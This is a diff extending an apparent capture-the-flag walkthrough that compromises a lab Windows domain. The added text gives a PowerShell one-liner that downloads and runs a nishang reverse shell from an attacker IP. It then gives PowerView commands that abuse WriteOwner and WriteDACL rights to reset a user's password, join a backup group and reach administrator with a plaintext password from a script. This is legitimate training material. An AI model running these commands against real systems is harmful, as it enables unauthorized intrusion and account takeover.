@@ -152,6 +152,7 @@ We host the payload on our kali machine using a standard `python3` webserver and
 
 What's left is to send the email to `nico@megabank.com`
 
+### Sending the mail and some deception ;)
 we're going to use the `sendEmail` command with a couple flags:
 - `-t <RECEPIENT>`
 - `-f <SENDER>`
@@ -195,3 +196,89 @@ It was mentioned that the user has set up hash rules for multiple file types:
 ![Applocker-docx](Applocker-docx.jpg)
 
 This is why we generated an HTA payload using `msfvenom` instead.
+
+### Domain Enumeration using `SharpHound.ps1`
+
+Since running `.exe` is disabled using Group Policy, we turn to `BloodHound`'s PowerShell injestor (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
+
+Switching to powershell from cmd can be done with the below command using the famous nishang shell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
+
+`powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"`
+
+### A note on `SharpHound.ps1` output:
+
+`Sharphound.ps1` will generate version 3 `JSON` files. Those will not be compatible with the most recent version of BloodHound (currently it's at 4).
+
+![sharphound-ps1-json-version](sharphound-ps1-json-version.jpg)
+
+To get it working, we will need to get `BloodHound` version 3 from the official releases page (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)
+
+### Investigating Possible Exploit Paths
+
+Upon looking at `BloodHound`'s output, we notice that `nico` can set the `owner` for user `herman`
+
+![nico-can-write-owner](nico-can-write-owner.jpg)
+
+Simulating having owned the user `herman`, we notice we can reach the `backup_admins` group.
+
+This is because the `herman` user has a `WriteDACL` right over the group.
+
+![herman-has-write-dacl](herman-has-write-dacl.jpg)
+
+### Abusing `nico`'s `WriteOwner` right over `herman`
+
+Checking the help for the `WriteOwner` right, we notice we can use `PowerView`'s `Set-DomainObjectOwner` function.
+
+![set-dom-obj-owner](set-dom-obj-owner.jpg)
+
+Command: `Set-DomainObjectOwner -Identity herman -OwnerIdentity nico`
+
+We will need to folow with `Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword`
+
+![add-dom-object-acl](add-dom-object-acl.jpg)
+
+And set the password for `herman` using `Set-DomainUserPassword`
+
+![Set-dom-user-pwd](Set-dom-user-pwd.jpg)
+
+We create a `secure string` object using:
+
+`$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
+
+and set the password:
+
+`Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword`
+
+### Logging in as herman and joining the `backup_admins` group
+
+After resetting the password for `herman`, we're able to login via the open `SSH` port:
+
+![ssh-as-herman](ssh-as-herman.jpg)
+
+and we can add ourselves to the backup_admins easily with `Add-ADGroupMember 'backup_admins' -members herman`
+
+![joining-backup-admins](joining-backup-admins.jpg)
+
+### File System access with `backup_admins`'s group membership
+
+We first relog to refresh our access and check our newly-found acccess using `PowerShell`:
+
+```
+$ErrorActionPreference = 'silentlycontinue'
+ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
+$ErrorActionPreference = 'continue'
+```
+
+![file-access-as-backup-admins](file-access-as-backup-admins.jpg)
+
+The output suggests we should check out the files in the `Backup Scripts` folder.
+
+Checking the `BackupScript.ps1` shows a password:
+
+![backscript-password](backscript-password.jpg)
+
+### Exploit Path #1's End
+
+Using the password `Cr4ckMeIfYouC4n!` works with the administrator user over `SSH`:
+
+![got-admin-path-1](got-admin-path-1.jpg)
